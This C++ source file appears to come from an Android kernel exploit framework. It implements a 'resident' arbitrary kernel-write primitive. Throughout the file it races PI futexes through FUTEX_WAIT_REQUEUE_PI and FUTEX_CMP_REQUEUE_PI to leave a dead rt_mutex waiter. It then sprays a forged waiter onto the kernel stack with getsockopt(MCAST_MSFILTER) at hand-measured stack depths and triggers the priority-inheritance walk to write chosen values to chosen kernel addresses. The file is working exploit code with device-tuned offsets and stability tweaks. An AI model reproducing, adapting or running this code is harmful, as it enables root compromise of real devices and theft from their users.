#include "routes/multicast_waiter_route.h"

#include <netinet/in.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>

/* bionic exposes MCAST_MSFILTER through <linux/in.h>; keep the value explicit
 * so the calibration build never depends on the header set. */
#ifndef MCAST_MSFILTER
#define MCAST_MSFILTER 48
#endif

#if defined(__clang__)
#pragma clang diagnostic ignored "-Wvla-cxx-extension"
#endif

#include "common.h"
#include "session/exploit_session.hpp"
#include "target.h"

using namespace ghostlock;

/* Resident Multicast Waiter route owner (CPP13). The process-level instance
 * lives at file scope so every inlined access expands exactly like the
 * validated direct reference; the kernel5_resident_* wrappers in
 * route_operations.cpp forward to it. The two workers and the disarm/destroy
 * helpers stay translation-unit local. */

namespace {

MulticastWaiterRoute multicast_resident_route;

static double fops_elapsed_ms(struct timespec *ref) {
    return runtime_elapsed_ms(ref);
}

static const struct execution_settings *resident_execution_settings(void) {
    return target_profile_execution(&g_exploit_session.profile);
}

/* Settle between the respraying setsockopt and the scheduling change that
 * walks the PI chain.
 *
 * The forged waiter is written into the reclaiming syscall's kernel stack
 * frame. Reclaiming and walking it are two different threads, so a walk that
 * starts while the copy is still in flight observes a half-written object and
 * faults inside rt_mutex_adjust_prio_chain() (observed as waiter->lock == 0,
 * i.e. all zeroes at the first field the walk reads after a valid
 * waiter->task). Give the copy a bounded moment to land before triggering the
 * walk. Overridable at runtime for device tuning; the app passes
 * GHOSTLOCK_MCAST_SETTLE_US through to the native binary. */
static useconds_t multicast_post_spray_settle_us(void) {
    static useconds_t cached = 0;
    if (!cached) {
        useconds_t v = 500;
        const char *env = getenv("GHOSTLOCK_MCAST_SETTLE_US");
        if (env && *env) {
            const unsigned long parsed = strtoul(env, nullptr, 0);
            if (parsed > 0 && parsed <= 200000UL)
                v = static_cast<useconds_t>(parsed);
        }
        cached = v ? v : 1;
    }
    return cached;
}

static void multicast_waiter_interrupt(int sig) {
    (void) sig;
}

static long multicast_waiter_adjust(MulticastWaiterRouteContext *context) {
    struct sched_param sp = {.sched_priority = 0};
    int next = context->scheduler_policy == SCHED_NORMAL
            ? SCHED_BATCH : SCHED_NORMAL;
    long r = syscall(SYS_sched_setscheduler,
            atomic_load(&context->waiter_tid), next, &sp);
    context->scheduler_policy = next;
    return r;
}

/* Calibration: write one unique non-canonical marker per 8-byte slot instead
 * of the encoded waiter, so a PI-walk fault reports the buffer offset that
 * landed on the field the walk dereferenced. */
static int multicast_marker_mode(void) {
    static int cached = -1;
    if (cached < 0)
        cached = getenv("GHOSTLOCK_MCAST_MARKER") ? 1 : 0;
    return cached;
}

/* Cleanup stamp after a successful write: on by default, disable with
 * GHOSTLOCK_MCAST_CLEANUP=0 to compare against the un-cleaned behaviour. */
static int multicast_cleanup_enabled(void) {
    static int cached = -1;
    if (cached < 0) {
        const char *v = getenv("GHOSTLOCK_MCAST_CLEANUP");
        cached = (v && v[0] == '0' && v[1] == '\0') ? 0 : 1;
    }
    return cached;
}

/* Stack spray primitive.
 *
 * getsockopt(IPPROTO_IP, MCAST_MSFILTER) copies
 *   size0 = offsetof(struct group_filter, gf_slist_flex) = 0x90 bytes
 * of user data into a stack local of do_ip_getsockopt() (sp + 0x128 here); the
 * copy length is fixed by the kernel, optlen only has to be >= 0x90.
 *
 * The dispatch chain depends on the socket type (measured on the device with a
 * kprobe on __arch_copy_from_user, depth = task->stack + 0x4000 - dest):
 *   UDP/raw  0x3d0 + udp_getsockopt 0x10 + ip_getsockopt 0x50 + do_ip 0x2a0
 *            = 0x6d0 -> copy lands at depth 0x798 (0x30 ABOVE the waiter: only
 *            task/lock/wake_state/prio/deadline/ww_ctx are covered)
 *   TCP      0x3d0 + tcp_getsockopt 0x40 + ip_getsockopt 0x50 + do_ip 0x2a0
 *            = 0x700 -> copy lands at depth 0x7c8 == the waiter base, so the
 *            whole 0x58-byte struct (tree_entry first) is inside the buffer and
 *            mcast_waiter_off is 0. tcp_getsockopt() forwards every level other
 *            than SOL_TCP to icsk_af_ops->getsockopt == ip_getsockopt, so no
 *            connection is required.
 * gf_group.sa_family at buffer + 8 is AF_UNSPEC, so ip_mc_gsfget() bails out
 * before writing anything back over the sprayed bytes. */
static int multicast_waiter_spray(MulticastWaiterRouteContext *context,
        unsigned char *buffer, size_t size) {
    socklen_t len = (socklen_t) size;
    if (size < 0x90) return -1;
    return getsockopt(context->socket_fd, IPPROTO_IP, MCAST_MSFILTER,
            buffer, &len);
}

/* Socket variant used for the spray. The copy depth is decided by the dispatch
 * chain down to do_ip_getsockopt() (every frame below measured on this build):
 *   AF_INET / UDP    entry 0x3d0 + udp_getsockopt 0x10 + ip_getsockopt 0x50
 *                    + do_ip_getsockopt 0x2a0 = 0x6d0 -> depth 0x798
 *                    (waiter only from +0x30 on: mcast_waiter_off = -0x30)
 *   AF_INET / TCP    tcp_getsockopt tail-calls ip_getsockopt -> depth 0x788
 *   AF_INET6 / any   ipv6_getsockopt 0x50 (its SOL_IP branch calls
 *                    udp_prot.getsockopt, a real call, verified in machine
 *                    code) then udp_getsockopt 0x10 + ip_getsockopt 0x50:
 *                      SOCK_STREAM 0x3d0+0x50+0x10+0x50+0x2a0 -> depth 0x7e8
 *                      SOCK_DGRAM  0x3d0+0x10+0x50+0x10+0x50+0x2a0 -> 0x7f8
 *                    Both put the whole 0x58-byte waiter inside the 0x90-byte
 *                    buffer with a non-negative mcast_waiter_off (0x20/0x30).
 * Device-measured so far: AF_INET/UDP 0x798, AF_INET/TCP 0x788.
 * GHOSTLOCK_MCAST_SOCKET=udp|tcp|udp6|tcp6 calibrates this at runtime. */
static const char *multicast_socket_variant(void) {
    const char *v = getenv("GHOSTLOCK_MCAST_SOCKET");
    return (v && *v) ? v : "tcp6";
}

static int multicast_make_socket(void) {
    const char *v = multicast_socket_variant();
    if (strcmp(v, "udp") == 0)
        return socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
    if (strcmp(v, "tcp") == 0)
        return socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
    if (strcmp(v, "udp6") == 0)
        return socket(AF_INET6, SOCK_DGRAM | SOCK_CLOEXEC, 0);
    return socket(AF_INET6, SOCK_STREAM | SOCK_CLOEXEC, 0);
}

static int multicast_waiter_stamp(MulticastWaiterRouteContext *context,
        uintptr_t target, uintptr_t value,
        uintptr_t lock) {
    size_t size = context->layout.buffer_size;
    /* Kept dynamic: the size comes from validated profile geometry and
     * heap-backing it would enter the race window (CPP17 review, retained). */
    __extension__ unsigned char b[size];
    size_t o = context->layout.waiter_offset;
    memset(b, 0, sizeof(b));
    if (multicast_marker_mode()) {
        for (size_t i = 0; i + 8 <= size; i += 8) {
            uint64_t marker = 0x1000000000000000ULL | (uint64_t) i;
            memcpy(b + i, &marker, sizeof(marker));
        }
        uint16_t family = AF_UNSPEC;
        memcpy(b + 4, &family, sizeof(family));
        memcpy(b + 8, &family, sizeof(family));
        return multicast_waiter_spray(context, b, size);
    }
    /* Same pure encoder as the one-shot route; the resident also stamps the
     * erase words at the waiter head. */
    if (!encode_multicast_waiter(
            {reinterpret_cast<std::byte *>(b), size},
            o, context->layout.task_offset, context->layout.lock_offset,
            context->task, lock)) {
        return -1;
    }
    if (target) {
        support::put64(b, o, (target - 8) & ~(uintptr_t) 3);
        support::put64(b, o + 8, value);
    }
    uint16_t family = AF_UNSPEC;
    memcpy(b + 8, &family, sizeof(family));
    return multicast_waiter_spray(context, b, size);
}

static void *multicast_waiter_worker(void *arg) {
    auto *context = static_cast<MulticastWaiterRouteContext *>(arg);
    pin_to_core((size_t) context->consumer_cpu);
    sigset_t set;
    sigemptyset(&set);
    sigaddset(&set, SIGUSR1);
    pthread_sigmask(SIG_UNBLOCK, &set, nullptr);
    atomic_store(&context->waiter_tid, (int) syscall(SYS_gettid));
    support::futex_op(&context->lock2_futex, FUTEX_LOCK_PI_PRIVATE, 0, nullptr, nullptr, 0);
    atomic_store(&context->waiter_has_lock2, 1);
    while (!atomic_load(&context->owner_has_lock1)) sched_yield();
    atomic_store(&context->waiter_waiting, 1);
    support::futex_op(&context->condition_futex, FUTEX_WAIT_REQUEUE_PI_PRIVATE,
            0, nullptr, &context->lock1_futex, 0);
    context->socket_fd = multicast_make_socket();
    if (context->socket_fd < 0) return nullptr;
    pr_info("mcast spray socket variant=%s waiter_off=%zu buffer=%zu\n",
            multicast_socket_variant(), context->layout.waiter_offset,
            context->layout.buffer_size);
    multicast_waiter_stamp(context, 0, 0, context->lock);
    atomic_store(&context->waiter_ready, 1);
    while (!atomic_load(&context->stop_requested)) {
        if (atomic_exchange(&context->respray_requested, 0)) {
            uintptr_t lock = context->lock + context->layout.lock_slots_offset +
                    ((size_t) context->lock_slot++ % context->layout.lock_slot_count) *
                            context->layout.lock_slot_stride;
            multicast_waiter_stamp(context, context->target, context->value, lock);
            atomic_store(&context->sprayed, 1);
        }
        sched_yield();
    }
    uint32_t dummy = 0x80000000U | (uint32_t) getpid();
    struct timespec z = {0, 0};
    support::futex_op(&dummy, FUTEX_LOCK_PI_PRIVATE, 0, &z, nullptr, 0);
    support::futex_op(&context->lock2_futex, FUTEX_UNLOCK_PI_PRIVATE, 0, nullptr, nullptr, 0);
    while (!atomic_load(&context->owner_done)) sched_yield();
    close(context->socket_fd);
    context->socket_fd = -1;
    return nullptr;
}

static void *multicast_owner_worker(void *arg) {
    auto *context = static_cast<MulticastWaiterRouteContext *>(arg);
    pin_to_core((size_t) context->main_cpu);
    while (!atomic_load(&context->waiter_has_lock2)) sched_yield();
    support::futex_op(&context->lock1_futex, FUTEX_LOCK_PI_PRIVATE, 0, nullptr, nullptr, 0);
    atomic_store(&context->owner_has_lock1, 1);
    atomic_store(&context->owner_waiting, 1);
    support::futex_op(&context->lock2_futex, FUTEX_LOCK_PI_PRIVATE, 0, nullptr, nullptr, 0);
    support::futex_op(&context->lock1_futex, FUTEX_UNLOCK_PI_PRIVATE, 0, nullptr, nullptr, 0);
    support::futex_op(&context->lock2_futex, FUTEX_UNLOCK_PI_PRIVATE, 0, nullptr, nullptr, 0);
    atomic_store(&context->owner_done, 1);
    return nullptr;
}

static void multicast_waiter_disarm(MulticastWaiterRouteContext *context) {
    atomic_store(&context->stop_requested, 1);
    atomic_store(&context->race->consumer_go, 0);
    while (atomic_load(&context->race->consumer_inflight)) sched_yield();
    context->status.kernel_disarmed = 1;
}

static void multicast_waiter_destroy(MulticastWaiterRouteContext *context) {
    if (context->waiter_worker_started) {
        pthread_join(context->waiter_worker, nullptr);
        context->waiter_worker_started = 0;
    }
    if (context->owner_worker_started) {
        pthread_join(context->owner_worker, nullptr);
        context->owner_worker_started = 0;
    }
    if (context->socket_fd >= 0) {
        close(context->socket_fd);
        context->socket_fd = -1;
    }
    context->ready = 0;
    context->status.userspace_clean = 1;
    if (context->status.code != ROUTE_OK && context->status.kernel_disarmed) {
        context->status.code = ROUTE_FALLBACK_SAFE;
    }
}

}  // namespace

int MulticastWaiterRoute::start() noexcept {
    auto *context = this;
    if (context->ready) return 1;
    if (context->waiter_worker_started || context->owner_worker_started) {
        pr_warning("multicast resident remains partially armed; refusing restart\n");
        return 0;
    }
    MulticastWaiterLayout layout_value =
            target_profile_multicast_waiter_layout(&g_exploit_session.profile);
    const struct execution_settings *execution = resident_execution_settings();
    context->init(
            &g_exploit_session.race, nullptr, execution, layout_value, 1);
    context->main_cpu = runtime_config_snapshot().main_cpu;
    context->consumer_cpu = runtime_config_snapshot().consumer_cpu;
    uintptr_t bss = resolved_addresses_data_alias(
            &g_exploit_session.addresses, KIMAGE_TEXT_BASE + layout_value.fake_bss_image_offset);
    context->lock = bss + layout_value.fake_lock_offset;
    context->task = bss + layout_value.fake_task_offset;
    struct sigaction sa = {};
    sa.sa_handler = multicast_waiter_interrupt;
    sigemptyset(&sa.sa_mask);
    if (sigaction(SIGUSR1, &sa, nullptr) != 0) return 0;
    if (pthread_create(&context->waiter_worker, nullptr,
            multicast_waiter_worker, context) != 0)
        return 0;
    context->waiter_worker_started = 1;
    if (pthread_create(&context->owner_worker, nullptr,
            multicast_owner_worker, context) != 0)
        return 0;
    context->owner_worker_started = 1;
    struct timespec ready_started;
    clock_gettime(CLOCK_MONOTONIC, &ready_started);
    while (!(atomic_load(&context->waiter_has_lock2) &&
            atomic_load(&context->owner_has_lock1) &&
            atomic_load(&context->waiter_waiting) &&
            atomic_load(&context->owner_waiting))) {
        if (fops_elapsed_ms(&ready_started) >= execution->multicast_ready_timeout_ms)
            return 0;
        sched_yield();
    }
    usleep(execution->multicast_post_requeue_settle_us);
    errno = 0;
    long r = support::futex_op(&context->condition_futex, FUTEX_CMP_REQUEUE_PI_PRIVATE,
            1, (void *) 0, &context->lock1_futex, 0);
    context->condition_futex = 1;
    syscall(SYS_tgkill, getpid(), atomic_load(&context->waiter_tid), SIGUSR1);
    if (r >= 0 || (errno != EDEADLK && errno != EDEADLOCK)) return 0;
    clock_gettime(CLOCK_MONOTONIC, &ready_started);
    while (!atomic_load(&context->waiter_ready) &&
            fops_elapsed_ms(&ready_started) < execution->multicast_ready_timeout_ms)
        sched_yield();
    /* Let the kernel-side copy of the stamped buffer land before the
     * scheduling change walks the chain (see multicast_post_spray_settle_us). */
    usleep(multicast_post_spray_settle_us());
    if (!atomic_load(&context->waiter_ready))
        return 0;
    if (getenv("GHOSTLOCK_5X_NOWALK")) {
        /* Calibration: leave the dead waiter and the landed copy in place and
         * park, so a kprobe/ftrace reader can measure both stack depths without
         * triggering the PI walk (which panics when the geometry is wrong). */
        pr_success("5.x NOWALK calibration: waiter tid=%d parked; adjust skipped\n",
                atomic_load(&context->waiter_tid));
        for (;;) pause();
    }
    if (multicast_waiter_adjust(context) < 0)
        return 0;
    usleep(execution->multicast_post_adjust_settle_us);
    context->ready = 1;
    context->status.code = ROUTE_OK;
    pr_success("5.x resident writer ready bss=0x%zx lock=0x%zx task=0x%zx\n",
            bss, context->lock, context->task);
    return 1;
}

int MulticastWaiterRoute::write(uintptr_t target, uintptr_t value) noexcept {
    auto *context = this;
    if (!context->ready) return 0;
    context->target = target;
    context->value = value;
    atomic_store(&context->sprayed, 0);
    atomic_store(&context->respray_requested, 1);
    while (!atomic_load(&context->sprayed)) sched_yield();
    /* The worker signals `sprayed` from userspace, right after setsockopt()
     * returned; the kernel-side copy into the reclaiming stack frame is what
     * the walk consumes as the forged waiter. Settle before triggering it. */
    usleep(multicast_post_spray_settle_us());
    long r = multicast_waiter_adjust(context);
    pr_info("resident write 0x%zx -> 0x%zx ret=%ld\n", value, target, r);
    if (r == 0 && multicast_cleanup_enabled()) {
        /* Cleanup stamp. The write leaves the forged rb links in the dead
         * waiter, and any later walk that reaches it (another thread's PI
         * operation, a later sched_setscheduler, ...) keeps following them -
         * that is the state that wedges the machine even when the process is
         * parked and never exits. Re-stamp the same window with target == 0,
         * which skips the erase words and leaves exactly the encoded waiter
         * the phase-1 probe proved stable (empty rb nodes). The worker does the
         * stamp, so it lands in the reclaiming thread's kernel frame again. */
        context->target = 0;
        context->value = 0;
        atomic_store(&context->sprayed, 0);
        atomic_store(&context->respray_requested, 1);
        while (!atomic_load(&context->sprayed)) sched_yield();
        usleep(multicast_post_spray_settle_us());
        pr_success("mcast cleanup stamp landed; forged rb links dropped\n");
    }
    return r == 0;
}

void MulticastWaiterRoute::stop() noexcept {
    auto *context = this;
    if (!context->ready) {
        if (context->waiter_worker_started || context->owner_worker_started) {
            context->status.code = ROUTE_DIRTY_FAILURE;
            pr_warning("multicast resident partial setup retained for process exit\n");
        }
        return;
    }
    multicast_waiter_disarm(context);
    multicast_waiter_destroy(context);
    /* SESSION-04: the route owns only its route resources; reaping the
     * HeapContext references is the session's step after destroy. */
    g_exploit_session.release_resident_heap();
    pr_success("5.x resident writer disarmed\n");
}

MulticastWaiterRoute &resident_route(void) {
    return multicast_resident_route;
}
